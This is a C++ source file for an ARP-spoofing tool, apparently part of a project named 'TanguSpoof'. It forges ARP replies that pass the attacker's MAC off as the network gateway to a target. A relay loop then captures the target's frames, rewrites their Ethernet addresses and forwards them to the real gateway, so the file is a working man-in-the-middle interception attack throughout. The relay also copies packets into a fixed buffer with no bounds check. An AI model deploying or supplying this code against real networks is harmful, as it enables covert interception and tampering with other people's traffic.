#pragma once

#include "TanguSpoof"

ARPSpoofer::ARPSpoofer(pcap_t** Interface, Net::IPInfo Target)
	: NetInfo(Interface)
{
	Net::Utility::GetGatewayIPAddress(_Gateway.second);
	_Gateway.first = CollectNetworkInfo(_Gateway.second, 30.0);
	Net::Utility::GetIPAddress(_ARPFrame._Rsrc.ISrc);
	Net::Utility::GetMACAddress(_ARPFrame._Rsrc.MSrc);
	_ARPFrame._Rsrc.IDst = Target;
	_ARPFrame._Rsrc.MDst = CollectNetworkInfo(_ARPFrame._Rsrc.IDst, 30.0);
}

void ARPSpoofer::Reply(void)
{
	_ARPFrame._Rsrc.ISrc = _Gateway.second;
	GenerateARP(ARPArchitect::Opcode::REPLY);
}
void ARPSpoofer::Relay()
{
	byte			Msg[1500];
	Common		CommonPacketCapturer{ *_Interface };
	_PcapAnalyzer = &CommonPacketCapturer;
	
	while ((_Ret = pcap_next_ex(*_Interface, &_PacketHeader, &_PacketData)) >= 0)
	{
		if (!_Ret)
		{
			continue;
		}

		_PcapAnalyzer->PktParser(_PacketData, PktBegin::LAYER_DATALINK);
		if (Net::MACInfo{ CommonPacketCapturer._MyEthernet.Source } == _ARPFrame._Rsrc.MDst)
		{
			if (Net::MACInfo{ CommonPacketCapturer._MyEthernet.Destination } == _ARPFrame._Rsrc.MSrc)
			{
				memcpy(Msg, _PacketData, _PacketHeader->len);
				memcpy(Msg, *(_Gateway.first), SIZ_HARDWARE);
				memcpy(Msg + 6, *(_ARPFrame._Rsrc.MSrc), SIZ_HARDWARE);

				pcap_sendpacket(*_Interface, Msg, _PacketHeader->len);
			}
		}
	}
}